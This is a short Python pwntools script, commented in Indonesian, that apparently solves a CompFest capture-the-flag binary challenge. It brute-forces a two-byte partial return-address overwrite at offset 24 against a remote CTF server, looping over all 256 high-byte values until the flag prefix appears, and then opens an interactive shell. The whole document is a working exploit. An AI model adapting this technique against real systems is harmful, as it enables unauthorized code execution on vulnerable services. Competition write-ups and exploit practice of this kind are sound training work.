#!/usr/bin/env python3
from pwn import *

# Setup
exe = context.binary = ELF(args.EXE or 'chall')
context.log_level = 'info'

offset = 24
low_byte = 0x9a

def start():
    # return process([exe.path])
    return remote('ctf.compfest.id',7002)

def bruteforce_exploit():
    for high_byte in range(0x100):
        p = start()
        
        try:
            target_2bytes = (high_byte << 8) | low_byte
            payload = flat({offset: p16(target_2bytes)})
            log.info(f"Mencoba dengan target: {hex(target_2bytes)}")
            p.send(payload)
            
            # Baca output dengan timeout yang sedikit lebih pendek
            output = p.recvall(timeout=0.5).decode(errors='ignore')

            # Cek apakah flag ada di output
            if "COMP" in output:
                success(f"Berhasil! High byte yang benar adalah: {hex(high_byte)}")
                print(output)
                p.interactive()
                return # Keluar dari fungsi jika berhasil
            
        except EOFError:
            # Ini adalah kasus normal jika proses crash karena payload salah.
            # Cukup lanjutkan ke iterasi berikutnya.
            pass
        except Exception as e:
            log.warning(f"Terjadi error tak terduga pada target {hex(target_2bytes)}: {e}")
        finally:
            # Pastikan proses selalu ditutup setelah setiap percobaan
            p.close()

    # Pesan jika loop selesai tanpa menemukan byte yang benar
    log.error(f"Brute-force selesai. Tidak ada kombinasi 0x??{low_byte:02x} yang berhasil.")

if __name__ == "__main__":
    bruteforce_exploit()
